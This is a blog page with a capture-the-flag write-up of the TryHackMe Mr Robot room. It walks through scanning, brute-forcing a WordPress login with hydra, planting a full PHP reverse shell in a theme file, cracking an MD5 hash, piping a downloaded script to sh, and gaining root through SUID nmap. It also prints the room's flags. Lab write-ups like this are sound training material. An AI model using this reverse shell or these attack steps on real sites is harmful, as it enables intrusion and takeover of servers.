@@ -1,0 +1,256 @@
+<!DOCTYPE html> <html lang="en"> <head> <meta http-equiv="Content-Type" content="text/html; charset=UTF-8"> <meta charset="utf-8"> <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"> <meta http-equiv="X-UA-Compatible" content="IE=edge"> <title> THM Mr Robot CTF | NonoHM </title> <meta name="author" content="NonoHM "> <meta name="description" content="Welcome to my personnal website. I am currently a 2nd year student in the " but r et t program. i like doing sports and music besides learning new things in it.> <meta name="keywords" content="jekyll, jekyll-theme, portfolio-website, writeups, projects"> <link rel="stylesheet" href="/assets/css/bootstrap.min.css?a4b3f509e79c54a512b890d73235ef04"> <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/mdbootstrap@4.20.0/css/mdb.min.css" integrity="sha256-jpjYvU3G3N6nrrBwXJoVEYI/0zw8htfFnhT9ljN3JJw=" crossorigin="anonymous"> <link defer rel="stylesheet" href="/assets/css/academicons.min.css?f0b7046b84e425c55f3463ac249818f5"> <link defer rel="stylesheet" type="text/css" href="https://fonts.googleapis.com/css?family=Roboto:300,400,500,700|Roboto+Slab:100,300,400,500,700|Material+Icons&amp;display=swap"> <link defer rel="stylesheet" href="/assets/css/jekyll-pygments-themes-github.css?591dab5a4e56573bf4ef7fd332894c99" media="" id="highlight_theme_light"> <link defer href="/assets/css/bootstrap-toc.min.css?6f5af0bb9aab25d79b2448143cbeaa88" rel="stylesheet"> <link rel="shortcut icon" href="data:image/svg+xml,&lt;svg%20xmlns=%22http://www.w3.org/2000/svg%22%20viewBox=%220%200%20100%20100%22&gt;&lt;text%20y=%22.9em%22%20font-size=%2290%22&gt;%E2%9A%9B%EF%B8%8F&lt;/text&gt;&lt;/svg&gt;"> <link rel="stylesheet" href="/assets/css/main.css?d41d8cd98f00b204e9800998ecf8427e"> <link rel="canonical" href="https://nonohm.github.io/blog/2023/THM-Mr-Robot-CTF/"> <link defer rel="stylesheet" href="/assets/css/jekyll-pygments-themes-native.css?5847e5ed4a4568527aa6cfab446049ca" media="none" id="highlight_theme_dark"> <script src="/assets/js/theme.js?0afe9f0ae161375728f7bcc5eb5b4ab4"></script> </head> <body class="fixed-top-nav "> <header> <nav id="navbar" class="navbar navbar-light navbar-expand-sm fixed-top" role="navigation"> <div class="container"> <a class="navbar-brand title font-weight-lighter" href="/"> NonoHM </a> <button class="navbar-toggler collapsed ml-auto" type="button" data-toggle="collapse" data-target="#navbarNav" aria-controls="navbarNav" aria-expanded="false" aria-label="Toggle navigation"> <span class="sr-only">Toggle navigation</span> <span class="icon-bar top-bar"></span> <span class="icon-bar middle-bar"></span> <span class="icon-bar bottom-bar"></span> </button> <div class="collapse navbar-collapse text-right" id="navbarNav"> <ul class="navbar-nav ml-auto flex-nowrap"> <li class="nav-item "> <a class="nav-link" href="/">about </a> </li> <li class="nav-item "> <a class="nav-link" href="/blog/">blog </a> </li> <li class="nav-item "> <a class="nav-link" href="/projects/">projects </a> </li> <li class="nav-item "> <a class="nav-link" href="/repositories/">repositories </a> </li> <li class="toggle-container"> <button id="light-toggle" title="Change theme"> <i class="fa-solid fa-moon"></i> <i class="fa-solid fa-sun"></i> </button> </li> </ul> </div> </div> </nav> <progress id="progress" value="0"> <div class="progress-container"> <span class="progress-bar"></span> </div> </progress> </header> <div class="container mt-5" role="main"> <div class="row"> <div class="col-sm-3"> <nav id="toc-sidebar" class="sticky-top"></nav> </div> <div class="col-sm-9"> <div class="post"> <header class="post-header"> <h1 class="post-title">THM Mr Robot CTF</h1> <p class="post-meta"> September 16, 2023 </p> <p class="post-tags"> <a href="/blog/2023"> <i class="fa-solid fa-calendar fa-sm"></i> 2023 </a>   ·   <a href="/blog/tag/thm"> <i class="fa-solid fa-hashtag fa-sm"></i> THM</a>   <a href="/blog/tag/ctf"> <i class="fa-solid fa-hashtag fa-sm"></i> CTF</a>   <a href="/blog/tag/privilege-escalation"> <i class="fa-solid fa-hashtag fa-sm"></i> Privilege Escalation</a>   <a href="/blog/tag/wordpress"> <i class="fa-solid fa-hashtag fa-sm"></i> Wordpress</a>   </p> </header> <article class="post-content"> <div id="markdown-content"> <h1 id="thm-mr-robot-ctf">THM Mr Robot CTF</h1> <h2 id="task-1---connect-to-our-network">Task 1 - Connect to our Network</h2> <p>To begin with, just connect to the network using the OpenVPN file provided in the access room.</p> <h2 id="task-2---hack-the-machine">Task 2 - Hack the machine</h2> <p>Firstly, I need to know more about the machine we want to access. To do that, we’ll be making a nmap scan to know if ports are opened.</p> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>nmap <span class="nt">-sV</span> <span class="nt">-O</span> 10.10.25.198
+<span class="o">[</span><span class="nb">sudo</span><span class="o">]</span> password <span class="k">for </span>kali: 
+Starting Nmap 7.94 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2023-09-16 09:59 EDT
+Nmap scan report <span class="k">for </span>10.10.25.198
+Host is up <span class="o">(</span>0.029s latency<span class="o">)</span><span class="nb">.</span>
+Not shown: 997 filtered tcp ports <span class="o">(</span>no-response<span class="o">)</span>
+PORT    STATE  SERVICE  VERSION
+22/tcp  closed ssh
+80/tcp  open   http     Apache httpd
+443/tcp open   ssl/http Apache httpd
+Device <span class="nb">type</span>: general purpose|specialized|storage-misc|broadband router|WAP|printer
+Running <span class="o">(</span>JUST GUESSING<span class="o">)</span>: Linux 5.X|3.X|4.X|2.6.X <span class="o">(</span>89%<span class="o">)</span>, Crestron 2-Series <span class="o">(</span>87%<span class="o">)</span>, HP embedded <span class="o">(</span>87%<span class="o">)</span>, Asus embedded <span class="o">(</span>86%<span class="o">)</span>
+OS CPE: cpe:/o:linux:linux_kernel:5.4 cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4 cpe:/o:crestron:2_series cpe:/h:hp:p2000_g3 cpe:/o:linux:linux_kernel:2.6 cpe:/h:asus:rt-n56u cpe:/o:linux:linux_kernel:3.4
+Aggressive OS guesses: Linux 5.4 <span class="o">(</span>89%<span class="o">)</span>, Linux 3.10 - 3.13 <span class="o">(</span>88%<span class="o">)</span>, Linux 3.10 - 4.11 <span class="o">(</span>88%<span class="o">)</span>, Linux 3.12 <span class="o">(</span>88%<span class="o">)</span>, Linux 3.13 <span class="o">(</span>88%<span class="o">)</span>, Linux 3.13 or 4.2 <span class="o">(</span>88%<span class="o">)</span>, Linux 3.2 - 3.5 <span class="o">(</span>88%<span class="o">)</span>, Linux 3.2 - 3.8 <span class="o">(</span>88%<span class="o">)</span>, Linux 4.2 <span class="o">(</span>88%<span class="o">)</span>, Linux 4.4 <span class="o">(</span>88%<span class="o">)</span>
+No exact OS matches <span class="k">for </span>host <span class="o">(</span><span class="nb">test </span>conditions non-ideal<span class="o">)</span><span class="nb">.</span>
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="nb">.</span>
+Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned <span class="k">in </span>38.15 seconds
+</code></pre></div></div> <p>It shows that the ports 22 (ssh), 80 (http) and 443 (https) are currently running. We’ll verify if a vulnerable website is running.</p> <p>When access to the website, we are welcomed with a Mr Robot themed website with some commands to trigger actions.</p> <p><img src="/assets/img/images/thm_mr_robot_ctf_writeup/rydXD4X1T.png" alt="fsociety website"></p> <p>After some surfing with prepare command or fsociety, we continue using join. We are asked to put my email address, so we use a temporary mail if we receive something important.</p> <p><img src="/assets/img/images/thm_mr_robot_ctf_writeup/SysnE_4kT.png" alt="mail asking"></p> <p>After some time, nothing has been sent so we continue digging by looking at the html source code.</p> <p><img src="/assets/img/images/thm_mr_robot_ctf_writeup/Syk1_uVyT.png" alt="fsociety website source code"></p> <p>There’s nothing interesting so we fuzz the website to know if there any hidden webpage using</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ffuf <span class="nt">-w</span> /usr/share/seclists/Fuzzing.fuzz-Bo0om.txt <span class="nt">-u</span> http://10.10.150.113/FUZZ <span class="nt">-mc</span> 200
+
+┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-[/usr/share/seclists/Fuzzing]
+└─<span class="nv">$ </span>ffuf <span class="nt">-w</span> fuzz-Bo0oM.txt <span class="nt">-u</span> http://10.10.150.113/FUZZ <span class="nt">-mc</span> 200
+
+        /<span class="s1">'___\  /'</span>___<span class="se">\ </span>          /<span class="s1">'___\       
+       /\ \__/ /\ \__/  __  __  /\ \__/       
+       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
+        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
+         \ \_\   \ \_\  \ \____/  \ \_\       
+          \/_/    \/_/   \/___/    \/_/       
+
+       v2.0.0-dev
+________________________________________________
+
+ :: Method           : GET
+ :: URL              : http://10.10.150.113/FUZZ
+ :: Wordlist         : FUZZ: /usr/share/seclists/Fuzzing/fuzz-Bo0oM.txt
+ :: Follow redirects : false
+ :: Calibration      : false
+ :: Timeout          : 10
+ :: Threads          : 40
+ :: Matcher          : Response status: 200
+________________________________________________
+
+[Status: 200, Size: 1188, Words: 189, Lines: 31, Duration: 31ms]
+    * FUZZ: admin/
+
+[Status: 200, Size: 1188, Words: 189, Lines: 31, Duration: 31ms]
+    * FUZZ: admin/index
+
+[Status: 200, Size: 1188, Words: 189, Lines: 31, Duration: 32ms]
+    * FUZZ: admin/index.html
+
+[Status: 200, Size: 1188, Words: 189, Lines: 31, Duration: 30ms]
+    * FUZZ: index.html
+
+[Status: 200, Size: 309, Words: 25, Lines: 157, Duration: 29ms]
+    * FUZZ: license
+
+[Status: 200, Size: 309, Words: 25, Lines: 157, Duration: 29ms]
+    * FUZZ: license.txt
+
+[Status: 200, Size: 64, Words: 14, Lines: 2, Duration: 30ms]
+    * FUZZ: readme
+
+[Status: 200, Size: 64, Words: 14, Lines: 2, Duration: 29ms]
+    * FUZZ: readme.html
+
+[Status: 200, Size: 41, Words: 2, Lines: 4, Duration: 29ms]
+    * FUZZ: robots.txt
+
+[Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 754ms]
+    * FUZZ: wp-config.php
+
+[Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 709ms]
+    * FUZZ: wp-content/
+
+[Status: 200, Size: 2613, Words: 115, Lines: 53, Duration: 743ms]
+    * FUZZ: wp-login/
+
+[Status: 200, Size: 2613, Words: 115, Lines: 53, Duration: 748ms]
+    * FUZZ: wp-login.php
+
+:: Progress: [4842/4842] :: Job [1/1] :: 49 req/sec :: Duration: [0:01:43] :: Errors: 0 ::
+
+</span></code></pre></div></div> <p>We can see there is a robots.txt available so we check it.</p> <pre><code class="language-txt">User-agent: *
+fsocity.dic
+key-1-of-3.txt
+</code></pre> <p>With this clue, we try to go to the URL: After pressing enter, the flag n°1 for this CTF is given:</p> <p><em>Key 1: <code class="language-plaintext highlighter-rouge">073403c8a58a1f80d943455fb30724b9</code></em></p> <p>Then, we try to go to the URL https://10.10.150.113/fsocity.dic. When that is done, the browser downloaded the associated file.</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">head </span>fsocity.dic
+<span class="nb">true
+false
+</span>wikia
+from
+the
+now
+Wikia
+extensions
+scss
+window
+
+</code></pre></div></div> <p>The file is really long and looks like a password list. With ffuf, we found we can access to a wordpress login (https://10.10.150.113/wp-login.php) so we maybe have to bruteforce to access it.</p> <p><img src="/assets/img/images/thm_mr_robot_ctf_writeup/HJeufYVk6.png" alt="WP Panel login"></p> <p>With the username Elliot, the error message sent by wp is different (the username admin doesn’t work): i.e, if the username doesn’t exist, it returns <em>“Invalid username”</em> but if it’s exinsting, it returns <em>“The password you entered for the username <strong>USER</strong> is incorrect”</em>.</p> <p><img src="/assets/img/images/thm_mr_robot_ctf_writeup/r1WRHK4Jp.png" alt="Login Incorrect"></p> <p>Using hydra, we can retrieve the right password associated with the username Elliot.</p> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>hydra <span class="nt">-l</span> Elliot <span class="nt">-P</span> fsocity.dic  http://10.10.150.113 http-post-form <span class="s2">"/wp-login/:log=^USER^&amp;pwd=^PASS^:F=The password you entered for the username Elliot is incorrect."</span>
+</code></pre></div></div> <p>After obtaining the combo <code class="language-plaintext highlighter-rouge">Elliot:ER28-0652</code>, we connect to the wp pannel.</p> <p><img src="/assets/img/images/thm_mr_robot_ctf_writeup/H1YjDtNkT.png" alt="Dashboard"></p> <p>With the access, we can obtain a reverse shell by modifying the site with the <em>Editor</em> section in <em>Appearance</em>. Then, we modify the archive.php to put the following code:</p> <div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span>
+<span class="c1">// php-reverse-shell - A Reverse Shell implementation in PHP. Comments stripped to slim it down. RE: https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php</span>
+<span class="c1">// Copyright (C) 2007 pentestmonkey@pentestmonkey.net</span>
+
+<span class="nb">set_time_limit</span> <span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+<span class="nv">$VERSION</span> <span class="o">=</span> <span class="s2">"1.0"</span><span class="p">;</span>
+<span class="nv">$ip</span> <span class="o">=</span> <span class="s1">'10.11.24.118'</span><span class="p">;</span>
+<span class="nv">$port</span> <span class="o">=</span> <span class="mi">6870</span><span class="p">;</span>
+<span class="nv">$chunk_size</span> <span class="o">=</span> <span class="mi">1400</span><span class="p">;</span>
+<span class="nv">$write_a</span> <span class="o">=</span> <span class="kc">null</span><span class="p">;</span>
+<span class="nv">$error_a</span> <span class="o">=</span> <span class="kc">null</span><span class="p">;</span>
+<span class="nv">$shell</span> <span class="o">=</span> <span class="s1">'uname -a; w; id; sh -i'</span><span class="p">;</span>
+<span class="nv">$daemon</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+<span class="nv">$debug</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+
+<span class="k">if</span> <span class="p">(</span><span class="nb">function_exists</span><span class="p">(</span><span class="s1">'pcntl_fork'</span><span class="p">))</span> <span class="p">{</span>
+	<span class="nv">$pid</span> <span class="o">=</span> <span class="nb">pcntl_fork</span><span class="p">();</span>
+	
+	<span class="k">if</span> <span class="p">(</span><span class="nv">$pid</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
+		<span class="nf">printit</span><span class="p">(</span><span class="s2">"ERROR: Can't fork"</span><span class="p">);</span>
+		<span class="k">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
+	<span class="p">}</span>
+	
+	<span class="k">if</span> <span class="p">(</span><span class="nv">$pid</span><span class="p">)</span> <span class="p">{</span>
+		<span class="k">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>  <span class="c1">// Parent exits</span>
+	<span class="p">}</span>
+	<span class="k">if</span> <span class="p">(</span><span class="nb">posix_setsid</span><span class="p">()</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
+		<span class="nf">printit</span><span class="p">(</span><span class="s2">"Error: Can't setsid()"</span><span class="p">);</span>
+		<span class="k">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
+	<span class="p">}</span>
+
+	<span class="nv">$daemon</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
+<span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+	<span class="nf">printit</span><span class="p">(</span><span class="s2">"WARNING: Failed to daemonise.  This is quite common and not fatal."</span><span class="p">);</span>
+<span class="p">}</span>
+
+<span class="nb">chdir</span><span class="p">(</span><span class="s2">"/"</span><span class="p">);</span>
+
+<span class="nb">umask</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+
+<span class="c1">// Open reverse connection</span>
+<span class="nv">$sock</span> <span class="o">=</span> <span class="nb">fsockopen</span><span class="p">(</span><span class="nv">$ip</span><span class="p">,</span> <span class="nv">$port</span><span class="p">,</span> <span class="nv">$errno</span><span class="p">,</span> <span class="nv">$errstr</span><span class="p">,</span> <span class="mi">30</span><span class="p">);</span>
+<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nv">$sock</span><span class="p">)</span> <span class="p">{</span>
+	<span class="nf">printit</span><span class="p">(</span><span class="s2">"</span><span class="nv">$errstr</span><span class="s2"> (</span><span class="nv">$errno</span><span class="s2">)"</span><span class="p">);</span>
+	<span class="k">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
+<span class="p">}</span>
+
+<span class="nv">$descriptorspec</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span>
+   <span class="mi">0</span> <span class="o">=&gt;</span> <span class="k">array</span><span class="p">(</span><span class="s2">"pipe"</span><span class="p">,</span> <span class="s2">"r"</span><span class="p">),</span>  <span class="c1">// stdin is a pipe that the child will read from</span>
+   <span class="mi">1</span> <span class="o">=&gt;</span> <span class="k">array</span><span class="p">(</span><span class="s2">"pipe"</span><span class="p">,</span> <span class="s2">"w"</span><span class="p">),</span>  <span class="c1">// stdout is a pipe that the child will write to</span>
+   <span class="mi">2</span> <span class="o">=&gt;</span> <span class="k">array</span><span class="p">(</span><span class="s2">"pipe"</span><span class="p">,</span> <span class="s2">"w"</span><span class="p">)</span>   <span class="c1">// stderr is a pipe that the child will write to</span>
+<span class="p">);</span>
+
+<span class="nv">$process</span> <span class="o">=</span> <span class="nb">proc_open</span><span class="p">(</span><span class="nv">$shell</span><span class="p">,</span> <span class="nv">$descriptorspec</span><span class="p">,</span> <span class="nv">$pipes</span><span class="p">);</span>
+
+<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">is_resource</span><span class="p">(</span><span class="nv">$process</span><span class="p">))</span> <span class="p">{</span>
+	<span class="nf">printit</span><span class="p">(</span><span class="s2">"ERROR: Can't spawn shell"</span><span class="p">);</span>
+	<span class="k">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
+<span class="p">}</span>
+
+<span class="nb">stream_set_blocking</span><span class="p">(</span><span class="nv">$pipes</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span> <span class="mi">0</span><span class="p">);</span>
+<span class="nb">stream_set_blocking</span><span class="p">(</span><span class="nv">$pipes</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="mi">0</span><span class="p">);</span>
+<span class="nb">stream_set_blocking</span><span class="p">(</span><span class="nv">$pipes</span><span class="p">[</span><span class="mi">2</span><span class="p">],</span> <span class="mi">0</span><span class="p">);</span>
+<span class="nb">stream_set_blocking</span><span class="p">(</span><span class="nv">$sock</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
+
+<span class="nf">printit</span><span class="p">(</span><span class="s2">"Successfully opened reverse shell to </span><span class="nv">$ip</span><span class="s2">:</span><span class="nv">$port</span><span class="s2">"</span><span class="p">);</span>
+
+<span class="k">while</span> <span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
+	<span class="k">if</span> <span class="p">(</span><span class="nb">feof</span><span class="p">(</span><span class="nv">$sock</span><span class="p">))</span> <span class="p">{</span>
+		<span class="nf">printit</span><span class="p">(</span><span class="s2">"ERROR: Shell connection terminated"</span><span class="p">);</span>
+		<span class="k">break</span><span class="p">;</span>
+	<span class="p">}</span>
+
+	<span class="k">if</span> <span class="p">(</span><span class="nb">feof</span><span class="p">(</span><span class="nv">$pipes</span><span class="p">[</span><span class="mi">1</span><span class="p">]))</span> <span class="p">{</span>
+		<span class="nf">printit</span><span class="p">(</span><span class="s2">"ERROR: Shell process terminated"</span><span class="p">);</span>
+		<span class="k">break</span><span class="p">;</span>
+	<span class="p">}</span>
+
+	<span class="nv">$read_a</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="nv">$sock</span><span class="p">,</span> <span class="nv">$pipes</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="nv">$pipes</span><span class="p">[</span><span class="mi">2</span><span class="p">]);</span>
+	<span class="nv">$num_changed_sockets</span> <span class="o">=</span> <span class="nb">stream_select</span><span class="p">(</span><span class="nv">$read_a</span><span class="p">,</span> <span class="nv">$write_a</span><span class="p">,</span> <span class="nv">$error_a</span><span class="p">,</span> <span class="kc">null</span><span class="p">);</span>
+
+	<span class="k">if</span> <span class="p">(</span><span class="nb">in_array</span><span class="p">(</span><span class="nv">$sock</span><span class="p">,</span> <span class="nv">$read_a</span><span class="p">))</span> <span class="p">{</span>
+		<span class="k">if</span> <span class="p">(</span><span class="nv">$debug</span><span class="p">)</span> <span class="nf">printit</span><span class="p">(</span><span class="s2">"SOCK READ"</span><span class="p">);</span>
+		<span class="nv">$input</span> <span class="o">=</span> <span class="nb">fread</span><span class="p">(</span><span class="nv">$sock</span><span class="p">,</span> <span class="nv">$chunk_size</span><span class="p">);</span>
+		<span class="k">if</span> <span class="p">(</span><span class="nv">$debug</span><span class="p">)</span> <span class="nf">printit</span><span class="p">(</span><span class="s2">"SOCK: </span><span class="nv">$input</span><span class="s2">"</span><span class="p">);</span>
+		<span class="nb">fwrite</span><span class="p">(</span><span class="nv">$pipes</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span> <span class="nv">$input</span><span class="p">);</span>
+	<span class="p">}</span>
+
+	<span class="k">if</span> <span class="p">(</span><span class="nb">in_array</span><span class="p">(</span><span class="nv">$pipes</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="nv">$read_a</span><span class="p">))</span> <span class="p">{</span>
+		<span class="k">if</span> <span class="p">(</span><span class="nv">$debug</span><span class="p">)</span> <span class="nf">printit</span><span class="p">(</span><span class="s2">"STDOUT READ"</span><span class="p">);</span>
+		<span class="nv">$input</span> <span class="o">=</span> <span class="nb">fread</span><span class="p">(</span><span class="nv">$pipes</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="nv">$chunk_size</span><span class="p">);</span>
+		<span class="k">if</span> <span class="p">(</span><span class="nv">$debug</span><span class="p">)</span> <span class="nf">printit</span><span class="p">(</span><span class="s2">"STDOUT: </span><span class="nv">$input</span><span class="s2">"</span><span class="p">);</span>
+		<span class="nb">fwrite</span><span class="p">(</span><span class="nv">$sock</span><span class="p">,</span> <span class="nv">$input</span><span class="p">);</span>
+	<span class="p">}</span>
+
+	<span class="k">if</span> <span class="p">(</span><span class="nb">in_array</span><span class="p">(</span><span class="nv">$pipes</span><span class="p">[</span><span class="mi">2</span><span class="p">],</span> <span class="nv">$read_a</span><span class="p">))</span> <span class="p">{</span>
+		<span class="k">if</span> <span class="p">(</span><span class="nv">$debug</span><span class="p">)</span> <span class="nf">printit</span><span class="p">(</span><span class="s2">"STDERR READ"</span><span class="p">);</span>
+		<span class="nv">$input</span> <span class="o">=</span> <span class="nb">fread</span><span class="p">(</span><span class="nv">$pipes</span><span class="p">[</span><span class="mi">2</span><span class="p">],</span> <span class="nv">$chunk_size</span><span class="p">);</span>
+		<span class="k">if</span> <span class="p">(</span><span class="nv">$debug</span><span class="p">)</span> <span class="nf">printit</span><span class="p">(</span><span class="s2">"STDERR: </span><span class="nv">$input</span><span class="s2">"</span><span class="p">);</span>
+		<span class="nb">fwrite</span><span class="p">(</span><span class="nv">$sock</span><span class="p">,</span> <span class="nv">$input</span><span class="p">);</span>
+	<span class="p">}</span>
+<span class="p">}</span>
+
+<span class="nb">fclose</span><span class="p">(</span><span class="nv">$sock</span><span class="p">);</span>
+<span class="nb">fclose</span><span class="p">(</span><span class="nv">$pipes</span><span class="p">[</span><span class="mi">0</span><span class="p">]);</span>
+<span class="nb">fclose</span><span class="p">(</span><span class="nv">$pipes</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
+<span class="nb">fclose</span><span class="p">(</span><span class="nv">$pipes</span><span class="p">[</span><span class="mi">2</span><span class="p">]);</span>
+<span class="nb">proc_close</span><span class="p">(</span><span class="nv">$process</span><span class="p">);</span>
+
+<span class="k">function</span> <span class="n">printit</span> <span class="p">(</span><span class="nv">$string</span><span class="p">)</span> <span class="p">{</span>
+	<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nv">$daemon</span><span class="p">)</span> <span class="p">{</span>
+		<span class="k">print</span> <span class="s2">"</span><span class="nv">$string</span><span class="se">\n</span><span class="s2">"</span><span class="p">;</span>
+	<span class="p">}</span>
+<span class="p">}</span>
+
+<span class="cp">?&gt;</span>
+</code></pre></div></div> <p><img src="/assets/img/images/thm_mr_robot_ctf_writeup/H1eDtFEya.png" alt="Theme edit"></p> <p>We put a nc listener with the port 6870</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nc <span class="nt">-lnvp</span> 6870
+</code></pre></div></div> <p>We can access to the archive.php with the URL https://10.10.150.113/wp-content/themes/twentyfifteen/archive.php so we can get the reverse shell:</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nc <span class="nt">-lnvp</span> 6870        
+listening on <span class="o">[</span>any] 6870 ...
+connect to <span class="o">[</span>10.11.24.118] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.150.113] 60344
+Linux linux 3.13.0-55-generic <span class="c">#94-Ubuntu SMP Thu Jun 18 00:27:10 UTC 2015 x86_64 x86_64 x86_64 GNU/Linux</span>
+ 14:18:12 up  2:05,  0 <span class="nb">users</span>,  load average: 5.94, 5.60, 4.80
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+<span class="nv">uid</span><span class="o">=</span>1<span class="o">(</span>daemon<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1<span class="o">(</span>daemon<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>1<span class="o">(</span>daemon<span class="o">)</span>
+sh: 0: can<span class="s1">'t access tty; job control turned off
+$ whoami
+daemon
+$ ls /home
+robot
+$ ls /home/robot
+key-2-of-3.txt
+password.raw-md5
+$ cat /home/robot/key-2-of-3.txt
+cat: /home/robot/key-2-of-3.txt: Permission denied
+
+</span></code></pre></div></div> <p>We can’t read to the key-2-of-3.txt so we need to do a privesc to get the access to the user <code class="language-plaintext highlighter-rouge">robot</code>. However, we can try to bruteforce the hashed md5 password with john the ripper or just use some online db if it already been cracket like https://crackstation.net.</p> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">cat</span> /home/robot/password.raw-md5
+robot:c3fcd3d76192e4007dfb496cca67e13b
+</code></pre></div></div> <p>After that, we found that the password is:</p> <table> <thead> <tr> <th style="text-align: center">Hash</th> <th style="text-align: center">Type</th> <th style="text-align: center">Result</th> </tr> </thead> <tbody> <tr> <td style="text-align: center">c3fcd3d76192e4007dfb496cca67e13b</td> <td style="text-align: center">md5</td> <td style="text-align: center">abcdefghijklmnopqrstuvwxyz</td> </tr> </tbody> </table> <p>With it, we reconnect to the revshell and we spawn a new tty with python command:</p> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python <span class="nt">-c</span> <span class="s1">'import pty; pty.spawn("/bin/bash")'</span>
+</code></pre></div></div> <p>If we don’t do this, when we would want to do su, the command will say that there is no tty.</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>su robot
+password: 
+<span class="nb">cat </span>key-2-of-3.txt
+822c73956184f694993bede3eb39f959
+</code></pre></div></div> <p><em>Key 2: <code class="language-plaintext highlighter-rouge">822c73956184f694993bede3eb39f959</code></em></p> <p>After that, we’ll look for another vulnerabilities present on the machine. To do that simply, we’ll upload LinPeas with python <code class="language-plaintext highlighter-rouge">http.server</code>.</p> <p>Kali:</p> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl <span class="nt">-L</span> https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh
+<span class="nb">sudo </span>python3 <span class="nt">-m</span> http.server 8000 <span class="c">#Host</span>
+</code></pre></div></div> <p>Victim:</p> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl 10.10.145.120:8000/linpeas.sh <span class="o">&gt;</span> /tmp/linpeas.sh <span class="c">#Victim</span>
+<span class="nb">chmod </span>777 /tmp/linpeas.sh
+/tmp/linpeas.sh
+</code></pre></div></div> <p>After execution, we can see that nmap is a vector of PrivEsc because it has SUID with root permissions on it. After cheecking on https://gtfobins.github.io/gtfobins/nmap/, we will use the interactive mode exploit.</p> <p>Victim</p> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nmap <span class="nt">--interactive</span>
+<span class="o">!</span>sh
+<span class="c"># whoami</span>
+root
+<span class="s2">" find -name "</span>key-3-of-3<span class="s2">"
+/root/key-3-of-3.txt
+# cat /root/key-3-of-3.txt
+04787ddef27c3dee1ee161b21670b4e4
+</span></code></pre></div></div> <p><em>Key 3: <code class="language-plaintext highlighter-rouge">04787ddef27c3dee1ee161b21670b4e4</code></em></p> </div> </article> <br> <hr> <br> <ul class="list-disc pl-8"></ul> <h2 class="text-3xl font-semibold mb-4 mt-12">Enjoy Reading This Article?</h2> <p class="mb-2">Here are some more articles you might like to read next:</p> <li class="my-2"> <a class="text-pink-700 underline font-semibold hover:text-pink-800" href="/blog/2023/THM-CTF-Blog/">THM CTF Blog</a> </li> <li class="my-2"> <a class="text-pink-700 underline font-semibold hover:text-pink-800" href="/blog/2023/THM-CTF-Wonderland/">THM CTF Wonderland</a> </li> <li class="my-2"> <a class="text-pink-700 underline font-semibold hover:text-pink-800" href="/blog/2024/THM-Introduction-to-Cryptography/">THM Introduction to Cryptography</a> </li> <li class="my-2"> <a class="text-pink-700 underline font-semibold hover:text-pink-800" href="/blog/2023/THM-CTF-Investigating-Windows/">THM CTF Investigating Windows</a> </li> <li class="my-2"> <a class="text-pink-700 underline font-semibold hover:text-pink-800" 